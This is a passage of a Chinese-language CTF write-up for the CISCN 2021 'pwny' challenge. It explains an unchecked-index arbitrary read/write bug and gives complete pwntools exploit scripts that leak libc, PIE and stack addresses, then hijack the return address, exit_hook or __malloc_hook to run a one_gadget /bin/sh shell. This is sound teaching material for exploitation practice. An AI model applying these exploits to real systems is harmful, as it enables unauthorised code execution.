class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_BA0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 index; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v2);</span><br><span class="line">  index = v2;</span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  read(fd, &amp;v2, <span class="number">8uLL</span>);</span><br><span class="line">  qword_202060[index] = v2;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_B20</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v1 = <span class="number">0LL</span>;</span><br><span class="line">  read(fd, &amp;v1, <span class="number">8uLL</span>);</span><br><span class="line">  printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Result: %lx\n&quot;</span>, qword_202060[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于一开始的文件描述符是随机数，所以<code>read</code>直接报错退出很正常，我们通过<code>write</code>函数来覆盖fd（并没有限制索引的范围），但是第一次<code>read</code>的时候，由于第一次fd的是奇奇怪怪的数字，所以第一次读的时候会失败，但是会把fd覆盖成0，第二次读的时候就能成功读了</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/14.jpg" class=""><p>之后就能通过索引任意读写了，但是需要注意的是索引要以<code>QWORD</code>字节对齐来索引，往上翻有很多东西可以泄露<code>libc</code>，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.got:0000000000201F98 puts_ptr        dq offset puts</span><br><span class="line">.got:0000000000201FD0 exit_ptr        dq offset exit</span><br><span class="line">.got:0000000000201FA8 read_ptr        dq offset read</span><br><span class="line">.bss:0000000000202020 stdout          dq ?</span><br><span class="line">.bss:0000000000202040 stderr          dq ?</span><br></pre></td></tr></table></figure><p>计算方法就是<code>（0x202020 - 0x202060）/ 8</code>就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">read_s(p64(0xFFFFFFFFFFFFFFF8))</span><br><span class="line">io.recvuntil(&quot;Result: &quot;)</span><br><span class="line">libc_base = int(io.recvuntil(&#x27;\n&#x27;,drop = True),16) - libc.sym[&#x27;_IO_2_1_stdout_&#x27;]</span><br></pre></td></tr></table></figure><p>由于程序开了PIE，所以我们还得泄露<code>qword_202060</code>在运行时的地址，这里用<code>sub_9c0</code>来泄露，好多师傅用下面这条来泄露，原理都是一样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000202008 off_202008      dq offset off_202008</span><br></pre></td></tr></table></figure><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/15.jpg" class=""><p>泄露完前面这些地址之后有三种做法：</p><h4 id="劫持栈的返回地址"><a href="#劫持栈的返回地址" class="headerlink" title="劫持栈的返回地址"></a>劫持栈的返回地址</h4><p>之后就是泄露栈地址，栈地址简单粗暴</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">environ = libc_base + libc.sym[&#x27;environ&#x27;]</span><br><span class="line">print(hex(environ))</span><br><span class="line"></span><br><span class="line">read_s(p64((environ-bss_addr)//8))</span><br><span class="line">io.recvuntil(&quot;Result: &quot;)</span><br><span class="line">stack = int(io.recvuntil(&#x27;\n&#x27;,drop = True),16) -0x120</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = remote(&quot;124.71.230.240&quot;,&quot;26157&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;pwny&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_s</span>(<span class="params">idx</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_s</span>(<span class="params">idx</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.send(idx)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *$rebase(0xBA2)&quot;)</span></span><br><span class="line">write_s(<span class="number">0x100</span>)</span><br><span class="line">write_s(<span class="number">0x100</span>)</span><br><span class="line">read_s(p64(<span class="number">0xFFFFFFFFFFFFFFF8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a41c</span></span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]libc_base =&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">read_s(p64(<span class="number">0xFFFFFFFFFFFFFFA5</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">bss_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x9c0</span> +<span class="number">0x202060</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]bss_addr =&gt; &quot;</span>+<span class="built_in">hex</span>(bss_addr))</span><br><span class="line"></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(environ))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">read_s(p64((environ-bss_addr)//<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) -<span class="number">0x120</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]stack =&gt; &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">write_s((stack-bss_addr)//<span class="number">8</span>)</span><br><span class="line">io.sendline(p64(one_gadget))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="劫持exit-hook"><a href="#劫持exit-hook" class="headerlink" title="劫持exit_hook"></a>劫持exit_hook</h4><p><a href="https://blog.csdn.net/qq_43116977/article/details/105485947">exit_hook劫持</a></p><p><a href="https://www.cnblogs.com/bhxdn/p/14222558.html">exit_hook在pwn题中的应用</a></p><p>劫持<code>__malloc_hook</code>和<code>__free_hook</code>已经是基本操作了，但是<code>exit_hook</code>却从未涉及过，这里记录一下劫持<code>exit_hook</code>，其实讲<code>exit_hook</code>，也只是是为了跟之前的<code>malloc_hook</code>和<code>free_hook</code>名称统一一下，在调用<code>exit</code>的时候并没有一个叫<code>exit_hook</code>的东西出现，但这并不意味着我们不可以劫持<code>exit</code></p><p>写个小<code>demo</code>来调试看看<code>exit()</code>的调用过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;welcome to exit\n&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>exit</code>处下断点，我们跟进去看看，第一次运行跳到了<code>_dl_runtime_resolve</code>，不用管，重新运行一下好像就可以（应该静态编译的，不过问题不大</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/16.png" class=""><p>进去之后看到它首先调用<code>__run_exit_handlers</code></p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/17.jpg" class=""><p>在<a href="https://github.com/lunaczp/glibc-2.27">glibc-2.27源码</a>的<code>glibc-2.27-master\stdlib</code>目录下有exit.c的源码，也证实了上面的调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span> <span class="params">(<span class="keyword">int</span> status)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__run_exit_handlers</code>的源码就在上面，可以看到它调用了三个函数，但是动调的时候并没看到这三个函数，而是先到了<code>do-global-dtors-aux-and-do-global-ctors-aux</code>这两个函数，这个函数好像是用来辅助函数，不知道有啥用</p><p><a href="https://stackoverflow.com/questions/6477494/do-global-dtors-aux-and-do-global-ctors-aux">do-global-dtors-aux-and-do-global-ctors-aux</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line"> <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">void</span> (*atfct) (<span class="keyword">void</span>);</span><br><span class="line">     <span class="keyword">void</span> (*onfct) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);</span><br><span class="line">     <span class="keyword">void</span> (*cxafct) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">case</span> ef_free:</span><br><span class="line">   <span class="keyword">case</span> ef_us:</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> ef_on:</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure><p>之后就是<code>_dl_fini</code>函数</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/18.jpg" class=""><p>下面是源码在<code>glibc-2.27-master\elf</code>，为了查看方便，这里删去了绝大部分的代码，这里只留下两个关键的函数调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_dl_fini (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">...</span><br><span class="line">  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到它的定义发现它与<code>_rtld_local</code>有关</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __libc_lock_lock_recursive(NAME)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __rtld_lock_lock_recursive(NAME)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> IS_IN (rtld)</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> GL(name) _rtld_local._##name</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>用<code>pwndbg</code>可以查看<code>_rtld_global</code>这个结构体，也是删掉了好多</p><p>至此我们可以整理一下<code>exit</code>函数的调用链<code>exit() -&gt; _exit() -&gt; __run_exit_handlers -&gt; do-global-dtors-aux -&gt; do-global-ctors-aux -&gt; _dl_fini -&gt; __rtld_lock_lock_recursive/__rtld_lock_unlock_recursive </code>，只知道了这些链条之后，我们就可以进行劫持<code>__rtld_lock_lock_recursive/__rtld_lock_unlock_recursive</code>变成我们的<code>one_gadget</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _rtld_global</span><br><span class="line">$1 = &#123;</span><br><span class="line">...</span><br><span class="line">    l_next = 0x0, </span><br><span class="line">    l_prev = 0x7f1c918c9000, </span><br><span class="line">    l_real = 0x7f1c918e39f0 &lt;_rtld_global+2448&gt;, </span><br><span class="line">    l_ns = 0, </span><br><span class="line">    l_libname = 0x7f1c918e4030 &lt;_dl_rtld_libname&gt;, </span><br><span class="line"> ...</span><br><span class="line">    l_tls_dtor_count = 0, </span><br><span class="line">    l_relro_addr = 2266752, </span><br><span class="line">    l_relro_size = 2432, </span><br><span class="line">    l_serial = 0, </span><br><span class="line">    l_audit = 0x7f1c918e3e60 &lt;_rtld_global+3584&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  audit_data = &#123;&#123;</span><br><span class="line">      cookie = 0, </span><br><span class="line">      bindflags = 0</span><br><span class="line">    &#125; &lt;repeats 16 times&gt;&#125;, </span><br><span class="line">  _dl_rtld_lock_recursive = 0x7f1c916ba0e0 &lt;rtld_lock_default_lock_recursive&gt;, </span><br><span class="line">  _dl_rtld_unlock_recursive = 0x7f1c916ba0f0 &lt;rtld_lock_default_unlock_recursive&gt;, </span><br><span class="line">  _dl_make_stack_executable_hook = 0x7f1c916ccea0 &lt;__GI__dl_make_stack_executable&gt;, </span><br><span class="line">  _dl_stack_flags = 6, </span><br><span class="line">  _dl_tls_dtv_gaps = false, </span><br><span class="line">  _dl_tls_max_dtv_idx = 1, </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里一个计算的技巧是<code>_dl_rtld_lock_recursive</code>是<code>_rtld_global+3848</code>，我们可以在上面的结构体当中看到<code>l_real = 0x7f1c918e39f0 &lt;_rtld_global+2448&gt;</code>所以我们拿这个地址减去2448就是<code>_rtld_global</code>的地址，再加上3848就是<code>_dl_rtld_lock_recursive</code>，<code>_dl_rtld_unlock_recursive</code>同理</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/19.png" class=""><p>在这还有个小知识点，在查找<code>one_gadget</code>的时候如果直接用下面这条查找出来的<code>one_gadget</code>不太够用，但是如果我们加上<code>-l2</code>这个参数呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜ one_gadget libc-2.27.so -l2</span><br><span class="line"></span><br><span class="line">0x4f3d5 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f432 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a41c execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>可以看到多了几条<code>one_gadget</code>，但是相对来说条件也更加苛刻，但是有时候就是这么碰巧呢？对吧！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">➜ one_gadget libc-2.27.so -l2</span><br><span class="line">0x4f3d5 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f432 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0xe5617 execve(<span class="string">&quot;/bin/sh&quot;</span>, [rbp-0x88], [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="line"></span><br><span class="line">0xe561e execve(<span class="string">&quot;/bin/sh&quot;</span>, rcx, [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  [rcx] == NULL || rcx == NULL</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="line"></span><br><span class="line">0xe5622 execve(<span class="string">&quot;/bin/sh&quot;</span>, rcx, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rcx] == NULL || rcx == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0x10a41c execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line"></span><br><span class="line">0x10a428 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, [rax])</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [[rax]] == NULL || [rax] == NULL</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;124.71.230.240&quot;,&quot;26157&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;pwny&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_s</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_s</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.send(idx)</span><br><span class="line"></span><br><span class="line">write_s(<span class="number">256</span>)</span><br><span class="line">write_s(<span class="number">256</span>)</span><br><span class="line">read_s(p64(<span class="number">0xFFFFFFFFFFFFFFE7</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">libcbase = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>:-<span class="number">1</span>],<span class="number">16</span>)-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">read_s(p64(<span class="number">0xFFFFFFFFFFFFFFA5</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">bss_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x9c0</span> +<span class="number">0x202060</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]bss_addr =&gt; &quot;</span>+<span class="built_in">hex</span>(bss_addr))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x10a41c</span>,<span class="number">0x4f432</span>,<span class="number">0x4f3d5</span>,<span class="number">0xe5617</span>,<span class="number">0xe561e</span>,<span class="number">0xe5622</span>,<span class="number">0x10a428</span>]</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">exit_hook = <span class="built_in">str</span>((libcbase+<span class="number">0x61bf60</span>-bss_addr)/<span class="number">8</span>)[<span class="number">0</span>:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;exit_hook =&gt;&quot;</span>+exit_hook)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,exit_hook)</span><br><span class="line">p.send(p64(libcbase+one[<span class="number">6</span>]))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)<span class="comment">#触发exit</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="劫持malloc-hook"><a href="#劫持malloc-hook" class="headerlink" title="劫持malloc_hook"></a>劫持malloc_hook</h4><p>还记得在输入的时候用的是<code>scanf</code>嘛，<code>scanf</code>有个特性，就是当输入的字符串过长的时候，会分配堆块来存放字符串，这就给我们劫持<code>__malloc_hook</code>提供可能，我们只要往<code>__malloc_hook</code>里面写入<code>one_gadget</code>，再输入一长串的字符串，就能触发程序<code>malloc</code>，达到<code>one_gadget</code>的目的，但是这里需要用<code>realloc</code>来跳转栈帧才能是成功执行<code>one_gadget</code>，所以这里的调用链是<code>malloc -&gt; __malloc_hook -&gt; realloc -&gt; one_gadget</code></p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/20.jpg" class=""><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 